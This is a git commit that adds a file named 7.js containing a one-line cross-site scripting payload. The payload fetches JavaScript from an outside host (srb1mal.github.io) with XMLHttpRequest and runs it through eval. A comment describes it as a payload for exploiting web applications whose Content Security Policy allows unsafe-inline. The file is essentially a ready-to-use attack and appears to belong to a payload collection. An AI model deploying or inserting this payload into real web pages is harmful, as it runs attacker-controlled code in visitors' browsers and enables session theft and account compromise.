d33e305aa6a0deb49d2cb9fc2d2418f32c92b21f
Bimal_Kumar_Sahoo <60147925+srb1mal@users.noreply.github.com>
2023-01-26 22:18:24 +0530

    Create 7.js

---
+++ 7.js
@@ -0,0 +1,3 @@
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//srb1mal.github.io");a.send();</script>
+
+###XMLHTTPRequest Payload - For exploitation of web applications with Content Security Policies containing script-src but have unsafe-inline enabled.
